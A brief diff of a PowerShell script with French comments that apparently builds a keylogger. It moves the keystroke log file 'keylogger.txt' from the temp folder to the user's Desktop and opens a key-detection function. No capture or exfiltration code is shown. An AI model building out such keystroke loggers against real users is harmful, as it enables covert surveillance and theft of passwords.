@@ -1,8 +1,5 @@
-# Obtenir le chemin du répertoire temporaire de l'utilisateur
-$tempDir = [System.IO.Path]::GetTempPath()
-
-# Créer le chemin d'accès complet du fichier de log dans le répertoire temporaire
-$logfile = Join-Path -Path $tempDir -ChildPath "keylogger.txt"
+# Créer un objet pour enregistrer les frappes dans un fichier texte
+$logfile = "$env:userprofile\Desktop\keylogger.txt"
 
 # Fonction pour détecter les frappes du clavier
 function Get-KeyPress {
